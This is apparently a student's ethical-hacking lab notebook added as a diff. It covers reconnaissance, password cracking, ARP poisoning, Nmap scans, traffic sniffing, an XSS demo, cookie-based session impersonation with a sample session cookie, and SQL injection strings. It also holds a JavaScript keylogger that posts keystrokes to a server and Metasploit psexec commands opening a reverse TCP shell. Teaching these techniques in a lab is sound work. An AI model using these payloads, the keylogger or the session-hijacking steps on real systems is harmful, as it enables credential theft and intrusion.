@@ -1,0 +1,322 @@
+
+PRACTICAL : 01
+AIM : Use Google and Whois for Reconnaisasance.
+Description:
+Reconnaissance : collecting a inform about particular portal or website, so using 
+below tool or Portal we will gather information about website or particular 
+portal
+1) Whois
+2) Shodan.io  142.250.189.174
+Step1: Open the WHO.is website
+Step 2: Enter the website name or ip address and hit the “Enter button”.
+Step 3: get information
+Step1: Open the Shodan.io website
+Step 2: Enter the ip address and hit the “Enter button”.
+Step 3: get information
+
+-----------------------------------------------------------------------------
+
+PRACTICAL : 02
+AIM : 
+2.1) Use CryptTool to encrypt and decrypt passwords using RC4 algorithm.
+2.2) Use Cain and Abel for cracking Windows account password using 
+Dictionary attack and to decode wireless network passwords
+Performed :
+2.1) Use CryptTool to encrypt and decrypt passwords using RC4 algorithm.
+Step 1: Open CryptTool take plantext.
+Step 2: Take a plaintext (name somethng)
+Step 3 Using RC4 Encryption of plaintext (namesomethng)
+Step 4: Using RC4 Decryption
+2.2) Use Cain and Abel for cracking Windows account password using 
+Dictionary attack and to decode wireless network passwords
+Performed :
+Step 1: Open Cain and Abel tool
+Step 2: Click on HASH Calcuator ,Enter the password to convert into hash
+Step 3 : Take MD5 values and paste the value into the MD5 Hashes field you have converted
+Step 4 : Right Click on the hash and select the dictionary attack
+Then right click on the file and select (Add to List) and then select the Wordlist
+---------------------------------------------------------------------------------------------------------
+
+PRACTICAL : 03
+AIM : 
+3.1) Using TraceRoute, ping, ifconfig, netstat Command .
+3.2) Perform ARP Poisoning in Windows .
+Performed :
+3.1) Using TraceRoute, ping, ifconfig, netstat Command .
+Step 1: Open cmd & type tracert command and type www.siesascs.edu.in 
+press “Enter”. After that type ping ,ipconfig and netstat command respectively
+• TRACEROUTE
+• PING 157.240.22.35
+• IPCONFIG
+• NETSTAT
+
+3.2) Perform ARP Poisoning in Windows .
+Step 1 : Open Cain and abel tool.
+Step 2 : Select sniffer on the top.
+Step 3 : Next to folder icon click on icon name start/stop sniffer. Select device and click on ok.
+Step 4 : Click on “+” icon on the top. Click on ok.
+Step 5 : Shows the Connected host.
+Step 6 : Select APR at bottom.
+Step 7 : Click on “+” icon at the top.
+Step 8 : Click on start/stop ARP icon on top.
+Step 9 : Poisoning the source.
+Step 10: Go to any website on source ip address.
+Step 11: Go to password option in the cain & abel and see the visited site password.
+---------------------------------------------------------------------------------------------------------
+
+PRACTICAL : 04
+AIM : Using Nmap scanner to perform port scanning of various forms – ACK, 
+SYN, FIN, NULL, XMAS.
+• NOTE: Install Nmap for windows and install it. After that open cmd and type “nmap” to 
+check if it is installed properly. Now type the below commands.
+• ACK -sA (TCP ACK scan)
+It never determines open (or even open|filtered) ports. It is used to map out firewall 
+rulesets, determining whether they are stateful or not and which ports are filtered.
+Command: nmap -sA -T4 scanme.nmap.org
+• SYN (Stealth) Scan (-sS)
+SYN scan is the default and most popular scan option for good reason. It can be performed 
+quickly, scanning thousands of ports per second on a fast network not hampered by 
+intrusive firewalls.
+Command: nmap -p22,113,139 scanme.nmap.org
+• FIN Scan (-sF)
+Sets just the TCP FIN bit.
+Command: nmap -sF -T4 para
+• NULL Scan (-sN)
+Does not set any bits (TCP flag header is 0)
+Command: nmap –sN –p 22 scanme.nmap.org
+• XMAS Scan (-sX)
+Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree.
+Command: nmap -sX -T4 scanme.nmap.org
+--------------------------------------------------------------------------------------------------------------
+
+PRACTICAL : 05
+AIM:Use WireShark sniffer to capture network traffic and analyze.
+Performed :
+Step 1: Install and open WireShark .
+Step 2: select Interface option and click on start.
+Step 3: The source, Destination and protocols of the packets in the LAN network 
+are displayed.
+Step 4: Open a website in a new window and enter the user id and password then 
+sign in.
+Register if needed.
+Step 5: we will get error with invalid username and password
+Step 6: The wireshark tool will keep recording the packets.
+Step 7: Now stop the tool to stop recording and select filter as http to make the 
+search easier and click on apply.
+Step 8: Find the post methods for username and passwords.
+Step 9: U will see the email- id and password that you used to log in.
+---------------------------------------------------------------------------------------------------------------
+
+PRACTICAL : 06
+AIM: Simulate persistant Cross Site Scripting attack.
+Code: 
+DEMO1.PHP
+<div>
+    <form method="GET">
+        <input type="text" name="email" placeholder="Email"><br>
+        <input type="password" name="password" placeholder="Password"><br>
+        <input type="submit" name="login" value="Login">
+    </form>
+</div>
+
+<?php
+if(isset($_GET['login'])) {
+    echo "Entered by you:<br>";
+    echo "Email: " . $_GET['email'] . "<br>";
+    echo "Password: " . $_GET['password'];
+}
+?>
+
+code in input:<script>alert("Hello yourname!")</script>
+Output:
+------------------------------------------------------------------------------------------------------------
+
+PRACTICAL : 07
+AIM: Session impersonation using Firefox and Tamper Data add-on
+A] Session Impersonation
+STEPS
+1. Open FireFox
+2. Go to Tools > Addons > Extension
+3. Search and install EditThisCookie or Cookie Import/Export or any other Cookie tool
+4. Then Click on Cookie extension to get cookie
+5. Open a Website and Login and then click on export cookie
+ Performed :
+
+
+{
+    "name": "SN",
+    "value": "VI7BB58F4ACDA744089A1F08F10F50D14Α.ΤΟΚΑ1Α1A53286264803891EC93B6978CA95.1645727640.LO",
+    "domain": "flipkart.com",
+    "hostonly": false,
+    "path": "/",
+    "secure": false,
+    "httpOnly": true,
+    "sameSite": "no_restriction",
+    "session": false,
+    "firstPartyDomain": "",
+    "partitionKey": null,
+    "expirationDate": 1661506116,
+    "storeId": "firefox-default",
+    "id": 7
+}
+
+
+
+Tamper DATA add-on
+1. Open FireFox
+2. Go to Tools > Addons > Extension
+3. Search and install Temper Data
+Performed :
+
+--------------------------------------------------------------------------------------------------------------
+
+PRACTICAL : 08
+Aim:
+Performed :
+Step 1 : Open XAMPP and start apache and mysql.
+Step 2 : Go to web browser and enter site localhost/phpmyadmin.
+Step 3 : Create database with name sql_db.
+Step 4 : Go to site localhost/sql_injection/setup.php and click on create/reset database.
+Step 5 : Go to login.php and login using admin and .
+Step 6 : Opens the home page.
+Step 7 : Go to security setting option in left and set security level low.
+Step 8 : Click on SQL injection option in left.
+ 
+Step 9 : Write "1" in text box and click on submit.
+Step 10 : Write "a' or ''='" in text box and click on submit.
+Step 11 : Write "1=1" in text box and click on submit.
+Step 12 : Write "1*" in text box and click on submit.
+-----------------------------------------------------------------------------------------------------------
+
+PRACTICAL : 09
+Aim: Create a simple keylogger using PHP JAVASCRIPT AND HTML
+CODE:
+keylog.php
+
+var keylog = {
+    // (A) SETTINGS & PROPERTIES
+    delay: 1000, // How often to send data to server
+    min: 5, // Send to server only when there are at least X presses
+    cache: [], // Key presses
+
+    // (B) LISTEN TO KEYPRESSES ON PAGE LOAD
+    init: function () {
+        window.addEventListener("keydown", function(evt){
+            keylog.cache.push(evt.key);
+        });
+        window.setInterval(keylog.send, keylog.delay);
+    },
+
+    // (C) SEND CAPTURED KEYS TO SERVER
+    send: function () {
+        if (keylog.cache.length > keylog.min) {
+            // (C1) DATA
+            var data = new FormData;
+            data.append("presses", JSON.stringify(keylog.cache));
+
+            // (C2) AJAX
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "keylog.php");
+            // OPTIONAL - FOR DEBUGGING OR FEEDBACK
+            // xhr.onload = function(){ console.log(this.response); };
+            xhr.send(data);
+
+            keylog.cache = [];
+        }
+    }
+};
+
+window.addEventListener("DOMContentLoaded", keylog.init);
+
+keylog.js
+var keylog = {
+    // (A) SETTINGS & PROPERTIES
+    delay: 1000, // How often to send data to server
+    min: 5, // Send to server only when there are at least X presses
+    cache: [], // Key presses
+
+    // (B) LISTEN TO KEYPRESSES ON PAGE LOAD
+    init: function () {
+        window.addEventListener("keydown", function(evt){
+            keylog.cache.push(evt.key);
+        });
+        window.setInterval(keylog.send, keylog.delay);
+    },
+
+    // (C) SEND CAPTURED KEYS TO SERVER
+    send: function () {
+        if (keylog.cache.length > keylog.min) {
+            // (C1) DATA
+            var data = new FormData;
+            data.append("presses", JSON.stringify(keylog.cache));
+
+            // (C2) AJAX
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "keylog.php");
+            // OPTIONAL - FOR DEBUGGING OR FEEDBACK
+            // xhr.onload = function(){ console.log(this.response); };
+            xhr.send(data);
+
+            keylog.cache = [];
+        }
+    }
+};
+
+window.addEventListener("DOMContentLoaded", keylog.init);
+
+keylog.html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Simple JS Keylogger Example</title>
+    <script src="keylog.js"></script>
+</head>
+<body>
+    <h1>Keylogger Example</h1>
+    <p>All keypresses will be collected!</p>
+    <input type="text"/>
+    <br><br>
+    <textarea></textarea>
+</body>
+</html>
+
+
+OUTPUT : localhost/keylog.html
+
+2024-03-07 11:36:57
+["v","a","r","i","o","u","s"]
+
+--------------------------------------------------------------------------------------------------------
+
+PRACTICAL NO. 10
+AIM: Using Metasploit to exploit
+Steps:
+Download and open metasploit
+Use exploit to attack the host
+Create the exploit and add the exploit to the victim’s PC
+
+use exploit/windows/smb/psexec
+set RHOST 192.168.1.100
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set SMBUSER victim
+set SMBPASS 53cr3t
+exploit
+
+
+use exploit/windows/smb/psexec
+set RHOST 192.168.1.100
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set SMBUser victim
+set SMBPass 53cr3t
+exploit
+
+---------------------------------------------------------------------------------------------------
+
+
+https://github.com/kibson6781/Kibson-678/blob/main/eh.pdf
+
